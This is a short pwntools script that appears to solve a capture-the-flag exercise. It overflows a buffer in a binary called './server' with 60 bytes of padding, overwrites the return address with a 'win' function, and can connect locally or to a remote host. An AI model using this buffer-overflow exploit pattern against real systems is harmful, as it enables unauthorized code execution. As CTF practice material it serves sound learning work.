from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./server"
elf = context.binary = ELF(exe, checksec=False)

io = start()

padding = 60

payload = flat(
    b"A"*padding,
    elf.symbols['win']
)

log.info(f"Win: {hex(elf.symbols['win'])}")

# write('payload', payload)

io.sendlineafter(b"text: ",payload)

io.interactive()